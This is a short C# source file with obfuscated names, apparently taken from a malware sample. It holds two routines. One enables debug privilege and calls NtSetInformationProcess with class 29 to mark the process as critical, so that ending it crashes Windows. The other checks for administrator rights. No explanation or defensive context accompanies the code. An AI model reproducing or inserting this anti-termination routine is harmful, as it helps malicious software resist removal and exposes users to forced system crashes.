using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace coxZRmDhvSAWo;

public static class c000010
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr p0, int p1, ref int p2, int p3);

	public static void tpoDbbyMSIwk()
	{
		int p = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref p, 4);
	}

	public static bool MrNSMcrnGHkS()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
